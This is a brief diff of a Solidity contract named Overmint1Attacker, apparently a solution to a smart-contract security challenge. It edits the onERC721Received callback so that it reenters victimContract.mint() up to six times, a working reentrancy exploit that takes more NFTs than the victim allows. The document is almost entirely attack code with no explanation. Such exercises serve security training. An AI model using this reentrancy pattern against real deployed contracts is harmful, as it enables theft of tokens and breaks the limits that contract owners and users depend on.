@@ -25,11 +25,9 @@ contract Overmint1Attacker {
         bytes calldata data
     ) external returns (bytes4) {
         recursionCount++;
-        if (recursionCount >= 5) {
-            return IERC721Receiver.onERC721Received.selector;
+        if (recursionCount < 6) {
+            victimContract.mint();
         }
-        victimContract.mint();
-
         return IERC721Receiver.onERC721Received.selector;
     }
 }
